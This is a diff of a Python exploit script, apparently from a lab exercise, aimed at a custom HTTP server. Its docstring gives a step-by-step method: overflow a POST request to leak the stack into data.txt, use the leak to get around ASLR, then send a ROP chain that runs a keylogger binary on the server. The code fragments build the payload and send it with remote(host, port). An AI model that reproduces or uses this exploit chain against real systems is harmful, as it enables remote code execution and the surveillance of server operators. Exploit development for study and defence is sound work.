@@ -1,5 +1,5 @@
 '''
-[FINDINGS]
+### FINDINGS ###
 Exploit in POST, writes the given data to the appointer file, data.txt in this case
 The handle and next handle_client functions are called after the POST request is sent
 The handle_client function makes a buffer and later puts the POST-PAYLOAD in that buffer
@@ -26,12 +26,12 @@ we can calculate the offset to the original handle function which the ROP chain 
 We can then use that to calculate the offset to the ROP chain addresses.
 Now our ROP chain is adjusted to the servers base address offset of ASLR and we can execute it to run the keylog binary.
 
-[EXPLOIT SUMMARY]
-POST request with a large Content-Length and small payload to write the stack to the data.txt file
-Download the data.txt file and find the RET address back to the handle function
-Calculate the offset to the original handle function and adjust the ROP chain to the servers base address offset
-Adjust the ROP chain to the servers base address offset
-Send the ROP chain to the server to execute the keylog binary
+### EXPLOIT SUMMARY ###
+1. POST request with a large Content-Length and small payload to write the stack to the data.txt file
+2. Download the data.txt file and find the RET address back to the handle function
+3. Calculate the offset to the original handle function and adjust the ROP chain to the servers base address offset
+4. Adjust the ROP chain to the servers base address offset
+5. Send the ROP chain to the server to execute the keylog binary
 '''
 
 from keystone import *
@@ -138,8 +138,10 @@ def create_ropchain_attack(handle_address):
 
 
 ### PERFORM ATTACK ###
+#remote("localhost", port).send(crash) # send crash payload
+# sleep(2)
 remote(host, port).send(post_exploit)
-sleep(3)
+sleep(2)
 
 download_data_file()
 handle_address = get_handle_address()
